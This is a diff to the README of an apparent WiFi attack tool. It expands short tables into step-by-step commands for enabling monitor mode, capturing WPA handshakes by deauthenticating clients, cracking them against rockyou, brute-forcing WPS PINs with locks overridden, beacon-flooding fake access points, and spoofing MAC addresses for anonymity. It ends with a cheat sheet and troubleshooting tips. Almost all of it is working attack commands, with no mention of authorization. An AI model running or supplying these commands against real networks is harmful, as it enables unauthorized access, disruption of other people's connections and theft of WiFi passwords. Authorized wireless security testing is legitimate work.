@@ -125,33 +125,285 @@ sudo python3 wifi_purple_improved.py
 
 ---
 
-## 🎯 Tool Categories
+## 🎯 Tool Categories & Commands
 
 ### 🔧 Setup Tools
-| Tool | Description | Usage |
-|------|-------------|-------|
-| Start Monitor | Enable monitor mode | Required before scanning |
-| Stop Monitor | Disable monitor mode | Return to normal mode |
-| View Interfaces | Show network interfaces | Check your adapters |
-| Restart Network | Restart NetworkManager | Fix connection issues |
+
+#### Start Monitor Mode
+**Description:** Enable monitor mode on your WiFi adapter  
+**Command Used:**
+```bash
+airmon-ng check kill && airmon-ng start {interface}
+```
+**Example:**
+```bash
+airmon-ng check kill && airmon-ng start wlan0
+```
+**What it does:**
+- Kills interfering processes
+- Enables monitor mode
+- Creates monitor interface (e.g., wlan0mon)
+
+---
+
+#### Stop Monitor Mode
+**Description:** Disable monitor mode and return to normal mode  
+**Command Used:**
+```bash
+airmon-ng stop {monitor_interface}
+```
+**Example:**
+```bash
+airmon-ng stop wlan0mon
+```
+**What it does:**
+- Stops monitor mode
+- Returns interface to managed mode
+
+---
+
+#### View Interfaces
+**Description:** Display all network interfaces  
+**Command Used:**
+```bash
+ifconfig
+```
+**What it shows:**
+- Interface names (wlan0, eth0, etc.)
+- MAC addresses
+- IP addresses
+- Interface status
+
+---
+
+#### Restart Network
+**Description:** Restart NetworkManager to fix connection issues  
+**Command Used:**
+```bash
+service NetworkManager stop && service NetworkManager start && airmon-ng check kill
+```
+**What it does:**
+- Stops NetworkManager
+- Starts NetworkManager
+- Kills interfering processes
+
+---
 
 ### 🔍 Scanning Tools
-| Tool | Description | Usage |
-|------|-------------|-------|
-| Scan Networks | Find WiFi networks | Discover targets |
-| Capture Handshake | Capture WPA handshake | Get authentication data |
+
+#### Scan Networks
+**Description:** Scan for nearby WiFi networks  
+**Command Used:**
+```bash
+airodump-ng {monitor_interface} -M --band abg
+```
+**Example:**
+```bash
+airodump-ng wlan0mon -M --band abg
+```
+**What it shows:**
+- BSSID (MAC address of AP)
+- PWR (Signal strength)
+- Beacons (Packets sent by AP)
+- CH (Channel)
+- ENC (Encryption type)
+- ESSID (Network name)
+- Connected clients
+
+**Parameters:**
+- `-M` : Enable manufacturer display
+- `--band abg` : Scan 2.4GHz and 5GHz bands
+
+---
+
+#### Capture Handshake
+**Description:** Capture WPA/WPA2 handshake for password cracking  
+**Commands Used:**
+```bash
+# Capture handshake
+airodump-ng -c {channel} --bssid {bssid} -w {output_path} {interface}
+
+# Deauthenticate clients (force reconnection)
+aireplay-ng -0 {packets} -a {bssid} {interface}
+```
+**Example:**
+```bash
+# Terminal 1: Capture
+airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w /tmp/handshake wlan0mon
+
+# Terminal 2: Deauth
+aireplay-ng -0 10 -a AA:BB:CC:DD:EE:FF wlan0mon
+```
+**What it does:**
+- Captures packets on specific channel
+- Deauthenticates clients to force handshake
+- Saves capture to .cap file
+
+**Parameters:**
+- `-c` : Channel number
+- `--bssid` : Target AP MAC address
+- `-w` : Output file path
+- `-0` : Deauth attack
+- `{packets}` : Number of deauth packets (0 = continuous)
+- `-a` : Target AP MAC
+
+---
 
 ### ⚡ Attack Tools
-| Tool | Description | Usage |
-|------|-------------|-------|
-| Crack Password | Crack handshake | Recover password |
-| WPS Attack | Exploit WPS PIN | Attack WPS routers |
-| Fake AP | Create fake AP | Deception attacks |
+
+#### Crack Password
+**Description:** Crack captured WPA/WPA2 handshake using wordlist  
+**Command Used:**
+```bash
+aircrack-ng {handshake_file} -w {wordlist}
+```
+**Example:**
+```bash
+aircrack-ng /tmp/handshake-01.cap -w /usr/share/wordlists/rockyou.txt
+```
+**What it does:**
+- Reads captured handshake
+- Tests passwords from wordlist
+- Displays password if found
+
+**Parameters:**
+- `{handshake_file}` : Path to .cap file
+- `-w` : Path to wordlist file
+
+**Popular Wordlists:**
+- `/usr/share/wordlists/rockyou.txt` (Kali Linux default)
+- Custom wordlists for better success
+
+---
+
+#### WPS Attack
+**Description:** Exploit WPS PIN vulnerability on routers  
+**Command Used:**
+```bash
+bully {interface} -b {bssid} -c {channel} -e {essid} --force -F -v 3
+```
+**Example:**
+```bash
+bully wlan0mon -b AA:BB:CC:DD:EE:FF -c 6 -e "MyNetwork" --force -F -v 3
+```
+**What it does:**
+- Brute forces WPS PIN
+- Retrieves WPA password if successful
+
+**Parameters:**
+- `-b` : Target BSSID
+- `-c` : Channel
+- `-e` : ESSID (network name)
+- `--force` : Force attack even if locked
+- `-F` : Ignore FCS errors
+- `-v 3` : Verbose level 3
+
+**Note:** Only works on WPS-enabled routers
+
+---
+
+#### Fake Access Point
+**Description:** Create fake access points for deception  
+**Command Used:**
+```bash
+mdk3 {interface} b -f {dictionary} -a -s 1000 -c {channel}
+```
+**Example:**
+```bash
+mdk3 wlan0 b -f /wordlist/fakeAP.txt -a -s 1000 -c 6
+```
+**What it does:**
+- Creates multiple fake APs
+- Uses names from dictionary file
+- Floods area with fake networks
+
+**Parameters:**
+- `b` : Beacon flood mode
+- `-f` : Dictionary file with AP names
+- `-a` : Use all MAC addresses
+- `-s 1000` : Speed (packets per second)
+- `-c` : Channel
+
+**Dictionary Example:**
+```
+FreeWiFi
+PublicWiFi
+GuestNetwork
+Free_Internet
+```
+
+---
 
 ### 🛠️ Utilities
-| Tool | Description | Usage |
-|------|-------------|-------|
-| Change MAC | Spoof MAC address | Anonymity |
+
+#### Change MAC Address
+**Description:** Spoof your MAC address for anonymity  
+**Command Used:**
+```bash
+ifconfig {interface} down && \
+ifconfig {interface} hw ether {new_mac} && \
+ifconfig {interface} up
+```
+**Example:**
+```bash
+ifconfig wlan0 down && \
+ifconfig wlan0 hw ether 00:11:22:33:44:55 && \
+ifconfig wlan0 up
+```
+**What it does:**
+- Disables interface
+- Changes MAC address
+- Re-enables interface
+
+**Parameters:**
+- `{interface}` : Network interface
+- `{new_mac}` : New MAC address (format: XX:XX:XX:XX:XX:XX)
+
+**Verify Change:**
+```bash
+ifconfig wlan0 | grep ether
+```
+
+---
+
+## 📊 Command Cheat Sheet
+
+### Quick Reference
+```bash
+# Start monitor mode
+sudo airmon-ng start wlan0
+
+# Scan networks
+sudo airodump-ng wlan0mon
+
+# Capture handshake (replace values)
+sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon
+
+# Deauth clients (in another terminal)
+sudo aireplay-ng -0 10 -a AA:BB:CC:DD:EE:FF wlan0mon
+
+# Crack password
+sudo aircrack-ng capture-01.cap -w /usr/share/wordlists/rockyou.txt
+
+# Stop monitor mode
+sudo airmon-ng stop wlan0mon
+```
+
+### Common Issues & Solutions
+
+**Issue:** `airmon-ng` not found  
+**Solution:** `sudo apt install aircrack-ng`
+
+**Issue:** No handshake captured  
+**Solution:** Increase deauth packets or wait for client connection
+
+**Issue:** Interface busy  
+**Solution:** `sudo airmon-ng check kill`
+
+**Issue:** Permission denied  
+**Solution:** Run with `sudo`
+
+---
 
 ---
 
